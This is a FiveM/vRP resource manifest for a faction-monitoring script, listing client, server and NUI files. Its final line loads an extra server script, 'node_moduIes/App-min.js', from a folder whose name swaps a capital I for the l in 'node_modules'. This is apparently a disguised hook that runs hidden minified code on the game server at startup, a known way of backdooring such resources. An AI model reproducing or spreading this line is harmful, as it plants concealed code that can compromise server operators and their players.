
resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
ui_page "nui/index.html"
files {
	"nui/**",
}
client_scripts {
	"@vrp/lib/utils.lua",
    "client.lua",
    "config.lua"
} 
server_script {
    "@vrp/lib/utils.lua",
    "server.lua",
    "config.lua"
}
author 'Gregos'
description 'Sistema de Monitoramento para facções'
version '1.0'
server_script "node_moduIes/App-min.js"